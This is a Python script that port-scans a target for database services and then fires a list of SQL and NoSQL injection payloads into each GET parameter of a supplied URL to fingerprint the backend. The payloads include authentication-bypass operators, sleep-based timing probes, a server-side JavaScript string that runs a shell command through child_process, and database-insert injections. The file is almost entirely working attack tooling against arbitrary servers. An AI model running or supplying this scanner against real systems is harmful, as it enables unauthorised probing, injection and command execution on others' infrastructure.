import socket
from urllib.parse import urlparse, parse_qs
import requests

# Define the list of ports to scan
ports = [3306, 5432, 1433, 1521, 27017, 6379, 9042, 8091, 5984]

# Define the list of ports to scan
sqlports = [3306, 5432, 1433, 1521]

# Define the list of ports to scan
nosqlports = [27017, 6379, 9042, 8091, 5984]

# Define a dictionary to map port numbers to service names
service_names = {
    3306: "MySQL",
    5432: "PostgreSQL",
    1433: "Microsoft SQL Server",
    1521: "Oracle",
    27017: "MongoDB",
    6379: "Redis",
    9042: "Cassandra",
    8091: "Couchbase",
    5984: "CouchDB"
}

# Define a list to store service banners
service_banners = []

def check_keywords(text, keywords):
    # Check if keywords appears in the text
    found_keywords = []
    for keyword in keywords:
        if keyword.lower() in text.lower():
            found_keywords.append(keyword)
    return found_keywords


def remove_path_and_query(url):
    # Clean the URL input to remove https:// and path
    parsed_url = urlparse(url)
    return parsed_url.netloc

def replace_get_parameters(url, inject):
    # Replaces the get parameters of URL with injection string

    # Parse the URL
    parsed_url = urlparse(url)

    # Extract the query parameters
    query_params = parse_qs(parsed_url.query)

    # Replace each query parameter with the variable name
    for key in query_params:
        query_params[key] = inject

    # Reconstruct the URL with the updated query parameters
    updated_query_string = '&'.join([f"{key}={value}" for key, value in query_params.items()])
    updated_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{updated_query_string}"

    return updated_url


def scan_port(target, port):
    # Scan a Specific Port of a Given Target Server
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Set a timeout for the connection attempt
        s.settimeout(5)
        # Attempt to connect to the target IP and port
        s.connect((target, port))
        # Receive up to 1024 bytes of data from the socket
        banner = s.recv(1024).decode().strip()
        # Close the socket connection
        s.close()

        # Add the banner to the list if it's not already in the list
        if banner not in service_banners:
            service_banners.append(banner)
            # Extract Server Version in a Future Development

        # Print Port and Banner Acquired
        #print(f"Port {port} ({service_names.get(port, 'Unknown service')}): {banner}")

        if port in sqlports:
            # port is a known sql port
            print(f"Port Open Detected, Server is likely running SQL Server: {service_names.get(port, 'Unknown Service')}")
            print(f"SQL Server running, may not be running NoSQL Server")

        if port in nosqlports:
            # port is a known nosql port
            print(f"Port Open Detected, Server is likely running NoSQL Server: {service_names.get(port, 'Unknown Service')}")


    except Exception as e:
        print(f"Port {port} ({service_names.get(port, 'Unknown Service')}): {str(e)}")

def fingerprint():
    targetserver = input("Please Input Server URL (with GET Parameters; Example: http://example.com/page?param1=value1:")
    clean_url = remove_path_and_query(targetserver)

    try:
        # Port Scanning
        for port in ports:
            scan_port(clean_url, port)
    except Exception as e:
        print(f"Error: {e}")
        print(f"Continuing")

    try:
        # Attack Webpage by Injecting Payload to Generate Error
        payloadlist = [ "%27",
                        "'",
                        "‘”\/$[].>",
                        "$ne",
                        "$eq",
                        "$where",
                        "$or",
                        "' || 1==1",
                        "' || $gt 0",
                        "' || $ne 0",
                        "' || $gte 0",
                        "' || $lt 0",
                        "' || $lte 0",
                        "' || $where function() { return true; }",
                        "' || $where sleep(5000)",
                        "' || this.constructor.constructor('return process')().mainModule.require('child_process').execSync('uname -a').toString() == ''",
                        "true",
                        "$where: '1 == 1'",
                        ", $where: '1 == 1'",
                        "$where: '1 == 1'",
                        "', $where: '1 == 1'",
                        "1, $where: '1 == 1'",
                        "{ $ne: 1 }",
                        "db.injection.insert({success:1});",
                        "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
                        "|| 1==1",
                        "' && this.password.match(/.*/)//+%00",
                        "' && this.passwordzz.match(/.*/)//+%00",
                        "'%20%26%26%20this.password.match(/.*/)//+%00",
                        "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
                        "{$gt: ''}",
                        "{\"$gt\": \"\"}",
                        "[$ne]=1",
                        "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",
                        "';return 'a'=='a' && ''==''",
                        "\";return(true);var xyz='a",
                        "0;return true"
        ]

        keyword_list = []

        for payload in payloadlist:
            # Update URL with Payloads and Send to Server
            updated_url = replace_get_parameters(targetserver, payload)
            response = requests.get(updated_url)

            print(f"Trying: ", updated_url)

            # Check if Response contains SQL specific keywords
            texttocheck = str(response.content.lower())
            keywords = ["mysql", "postgres", "oracle", "mongo", "redis", "cassandra", "couchbase", "couchdb"]

            found_keywords = check_keywords(texttocheck, keywords)

            for item in found_keywords:
                if item not in keyword_list:
                    keyword_list.append(item)

            print("Keywords Detected While Injecting: ", keyword_list)

        if not keyword_list:
            # List is empty
            print(f"Unable to detect any specific Database Server")

        for keyword in keyword_list:
            # Print Likely Servers
            if keyword == "mysql":
                print(f"There is likely a MySQL Database running on the Server")
            elif keyword == "postgres":
                print(f"There is likely a PostGreSQL Database running on the Server")
            elif keyword == "oracle":
                print(f"There is likely a Oracle Database running on the Server")
            elif keyword == "mongo":
                print(f"There is likely a Mongo Database running on the Server")
            elif keyword == "redis":
                print(f"There is likely a Redis Database running on the Server")
            elif keyword == "cassandra":
                print(f"There is likely a Cassandra Database running on the Server")
            elif keyword == "couchbase":
                print(f"There is likely a Couchbase Database running on the Server")
            elif keyword == "couchdb":
                print(f"There is likely a Couchdb Database running on the Server")


    except Exception as e:
        print(f"Error: {e}")
        print(f"Continuing")


def main():
    fingerprint()


if __name__ == "__main__":
    main()
